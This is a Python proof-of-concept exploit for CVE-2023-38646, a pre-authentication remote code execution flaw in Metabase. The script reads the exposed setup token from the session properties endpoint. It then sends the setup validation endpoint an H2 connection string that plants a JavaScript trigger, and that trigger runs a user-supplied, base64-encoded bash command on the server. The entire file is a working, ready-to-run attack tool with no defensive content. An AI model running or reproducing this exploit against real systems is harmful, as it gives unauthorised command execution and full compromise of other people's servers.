# PoC for CVE-2023-38646
# (PoC) Author: github.com/traumatism

import argparse
import base64
from urllib.parse import urljoin, quote

import requests


def exploit(base_url: str, cmd: str):
    sess = requests.session()
    sess.verify = False

    first_json = sess.get(urljoin(base_url, 'api/session/properties')).json()

    if 'setup-token' not in first_json:
        print("[-] setup-token not found")
        exit()

    setup_token = first_json["setup-token"]

    if not setup_token:
        print("[-] setup-token invalid (NULL)")
        exit()

    print(f"[+] Setup token: {setup_token}")

    payload = "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;" \
              "CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n" \
              "java.lang.Runtime.getRuntime().exec('bash -c {echo,%s}|{base64,-d}|{bash,-i}')\n$$--=x" % cmd

    print(f"[+] Using payload: {payload}")

    response = sess.post(
        urljoin(base_url, 'api/setup/validate'),
        json={
            "token": setup_token,
            "details": {
                "is_on_demand": False,
                "is_full_sync": False,
                "is_sample": False,
                "cache_ttl": None,
                "refingerprint": False,
                "auto_run_queries": True,
                "schedules": {},
                "details": {
                    "db": payload,
                    "advanced-options": False,
                    "ssl": True,
                },
                "name": "an-sec-research-team",
                "engine": "h2",
            },
        },
    )

    print(f"[+] Server response: {response.text}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True,
                        help="The target URL including the protocol. Example: https://127.0.0.1:3000/", type=str)
    parser.add_argument('-c', '--command', required=True, help="The command to execute.", type=str)

    args = parser.parse_args()

    encoded_cmd = quote(base64.b64encode(args.command.encode()).decode())

    exploit(args.url, encoded_cmd)
